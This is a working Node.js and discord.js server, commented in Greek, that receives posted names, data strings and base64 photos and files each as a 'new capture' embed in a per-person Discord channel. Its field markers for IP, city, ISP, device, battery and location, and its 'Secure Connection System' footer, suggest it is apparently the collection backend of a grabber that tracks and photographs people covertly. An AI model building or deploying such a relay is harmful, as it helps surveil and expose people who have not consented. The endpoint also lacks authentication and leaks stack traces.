const { Client, GatewayIntentBits, EmbedBuilder, ChannelType } = require('discord.js');
const express = require('express');
const cors = require('cors');

// ---------- ΡΥΘΜΙΣΕΙΣ ----------
const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json({ limit: '50mb' }));

// ---------- BOT ----------
const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent
    ]
});

// ΤΑΥΤΟΤΗΤΕΣ
const TOKEN = process.env.BOT_TOKEN;
const SERVER_ID = process.env.SERVER_ID;
const CATEGORY_ID = '1545817704127266876'; // Η κατηγορία όπου θα δημιουργούνται τα κανάλια

// Αποθήκη για να θυμόμαστε τι έχουμε στείλει
const messageCache = new Map();

// ---------- ΕΚΚΙΝΗΣΗ BOT ----------
client.once('ready', () => {
    console.log(`✅ Bot online: ${client.user.tag}`);
    console.log(`📁 Θα δημιουργώ κανάλια στην κατηγορία ID: ${CATEGORY_ID}`);
    
    const guild = client.guilds.cache.get(SERVER_ID);
    if (guild) {
        const category = guild.channels.cache.get(CATEGORY_ID);
        if (category) {
            console.log(`✅ Βρέθηκε η κατηγορία: ${category.name}`);
        } else {
            console.error(`❌ Δεν βρέθηκε κατηγορία με ID: ${CATEGORY_ID}`);
        }
    } else {
        console.error(`❌ Δεν βρέθηκε server με ID: ${SERVER_ID}`);
    }
});

// ---------- ΒΟΗΘΗΤΙΚΕΣ ΣΥΝΑΡΤΗΣΕΙΣ ----------
function cleanName(name) {
    return name.toLowerCase()
        .replace(/\s+/g, '-')
        .replace(/[^a-z0-9-]/g, '')
        .substring(0, 30);
}

function parseDataToEmbed(dataString, userName, photoBase64) {
    const embed = new EmbedBuilder()
        .setColor(0x00ff88)
        .setTitle('📸 ΝΕΑ ΚΑΤΑΓΡΑΦΗ')
        .setAuthor({ 
            name: userName || 'Άγνωστος Χρήστης',
            iconURL: 'https://cdn.discordapp.com/emojis/1085933512993218630.png'
        })
        .setTimestamp()
        .setFooter({ 
            text: 'Secure Connection System',
            iconURL: 'https://cdn.discordapp.com/emojis/1085933512993218630.png'
        });

    if (photoBase64 && photoBase64.startsWith('data:image/')) {
        embed.setImage('attachment://photo.jpg');
    }

    const lines = dataString.split('\n').filter(line => line.trim() !== '');
    let currentField = '';
    let currentValue = '';
    let fields = [];
    
    for (const line of lines) {
        if (line.match(/^[📊👤🌐🏙️🌍📡🗺️📱💿🖥️🔋📶🕐⏱️📍🎯]/)) {
            if (currentField && currentValue) {
                fields.push({ name: currentField, value: currentValue, inline: false });
            }
            const parts = line.split(':');
            if (parts.length >= 2) {
                currentField = parts[0].trim();
                currentValue = parts.slice(1).join(':').trim();
            } else {
                currentField = 'ℹ️ Πληροφορία';
                currentValue = line;
            }
        } else {
            if (currentValue) {
                currentValue += '\n' + line;
            } else {
                currentValue = line;
            }
        }
    }
    
    if (currentField && currentValue) {
        fields.push({ name: currentField, value: currentValue, inline: false });
    }
    
    if (fields.length === 0) {
        embed.setDescription('```' + dataString + '```');
    } else {
        for (const field of fields) {
            let value = field.value;
            if (value.length > 1024) {
                value = value.substring(0, 1020) + '...';
            }
            embed.addFields({ 
                name: field.name, 
                value: value || 'Δεν υπάρχουν δεδομένα',
                inline: false 
            });
        }
    }
    
    return embed;
}

async function clearChannelMessages(channel) {
    try {
        const messages = await channel.messages.fetch({ limit: 100 });
        if (messages.size > 0) {
            await channel.bulkDelete(messages, true);
            console.log(`🗑️ Διαγράφηκαν ${messages.size} παλιά μηνύματα`);
        }
    } catch (error) {
        console.log('⚠️ Δεν μπόρεσα να διαγράψω όλα τα μηνύματα (μπορεί να είναι παλιά)');
    }
}

// ---------- ENDPOINTS ----------
app.post('/', async (req, res) => {
    console.log('\n📥 ΝΕΟ ΑΙΤΗΜΑ!');
    console.log('📦 Λήφθηκαν δεδομένα:', JSON.stringify(req.body, null, 2));
    
    const { name, data, photo } = req.body;
    
    if (!name || !data) {
        console.error('❌ Λείπουν δεδομένα (name ή data)');
        return res.status(400).json({ 
            success: false, 
            error: 'Missing name or data',
            received: req.body 
        });
    }
    
    try {
        const guild = client.guilds.cache.get(SERVER_ID);
        if (!guild) {
            console.error(`❌ Server με ID ${SERVER_ID} δεν βρέθηκε`);
            return res.status(500).json({ success: false, error: 'Server not found' });
        }
        
        const category = guild.channels.cache.get(CATEGORY_ID);
        if (!category) {
            console.error(`❌ Κατηγορία με ID ${CATEGORY_ID} δεν βρέθηκε`);
            return res.status(500).json({ success: false, error: 'Category not found' });
        }
        
        // Δημιουργία ονόματος καναλιού
        const channelName = `👤-${cleanName(name)}`;
        console.log(`📝 Αναζήτηση/δημιουργία καναλιού: ${channelName}`);
        
        // Αναζήτηση για υπάρχον κανάλι
        let channel = guild.channels.cache.find(
            c => c.type === ChannelType.GuildText && 
            c.name === channelName && 
            c.parentId === CATEGORY_ID
        );
        
        // Δημιουργία νέου καναλιού αν δεν υπάρχει
        if (!channel) {
            console.log(`📝 Δημιουργία νέου καναλιού...`);
            channel = await guild.channels.create({
                name: channelName,
                type: ChannelType.GuildText,
                parent: CATEGORY_ID,
                reason: `Κανάλι για τον χρήστη ${name}`
            });
            console.log(`✅ Δημιουργήθηκε το κανάλι: ${channel.name}`);
        } else {
            console.log(`✅ Βρέθηκε υπάρχον κανάλι: ${channel.name}`);
        }
        
        // Δημιουργία hash των νέων δεδομένων
        const dataHash = Buffer.from(data + (photo || '')).toString('base64').substring(0, 50);
        const cacheKey = `${channel.id}_${name}`;
        
        // Έλεγχος αν τα δεδομένα είναι ίδια με τα παλιά
        if (messageCache.has(cacheKey) && messageCache.get(cacheKey) === dataHash) {
            console.log(`⏭️ Τα δεδομένα είναι ίδια, δεν στέλνω ξανά`);
            return res.json({ 
                success: true, 
                channel: channel.name,
                message: 'Data unchanged - no new message sent'
            });
        }
        
        // Διαγραφή παλιών μηνυμάτων
        await clearChannelMessages(channel);
        
        // Δημιουργία embed
        const embed = parseDataToEmbed(data, name, photo);
        
        // Προετοιμασία για αποστολή
        let messageOptions = { embeds: [embed] };
        
        // Αν υπάρχει φωτογραφία, τη στέλνουμε ως attachment
        if (photo && photo.startsWith('data:image/')) {
            const base64Data = photo.replace(/^data:image\/\w+;base64,/, '');
            const buffer = Buffer.from(base64Data, 'base64');
            messageOptions.files = [{
                attachment: buffer,
                name: 'photo.jpg'
            }];
        }
        
        // Αποστολή
        await channel.send(messageOptions);
        console.log(`📤 ΕΠΙΤΥΧΙΑ! Στάλθηκε στο #${channel.name}`);
        
        // Αποθήκευση hash
        messageCache.set(cacheKey, dataHash);
        
        res.json({ 
            success: true, 
            channel: channel.name,
            message: 'Data sent successfully'
        });
        
    } catch (error) {
        console.error('❌ Σφάλμα κατά την αποστολή:', error);
        res.status(500).json({ 
            success: false, 
            error: error.message,
            stack: error.stack 
        });
    }
});

// Endpoint για έλεγχο υγείας
app.get('/', (req, res) => {
    res.json({
        status: 'online',
        bot: client.user?.tag || 'not ready',
        server: client.guilds.cache.get(SERVER_ID)?.name || 'not connected',
        category: CATEGORY_ID
    });
});

// Test endpoint
app.get('/test', (req, res) => {
    res.json({
        message: '✅ Το bot λειτουργεί!',
        bot: client.user?.tag || 'not ready',
        server: client.guilds.cache.get(SERVER_ID)?.name || 'not connected',
        category: CATEGORY_ID,
        instructions: 'Στείλε POST request στο / με { name, data, photo }'
    });
});

// ---------- ΕΚΚΙΝΗΣΗ ----------
app.listen(PORT, '0.0.0.0', () => {
    console.log(`🌐 Server τρέχει στη θύρα: ${PORT}`);
    console.log(`🔗 Δοκίμασε το test endpoint: https://discord-bot-kvbn.onrender.com/test`);
});

client.login(TOKEN).catch(err => {
    console.error('❌ Σφάλμα σύνδεσης bot:', err);
});
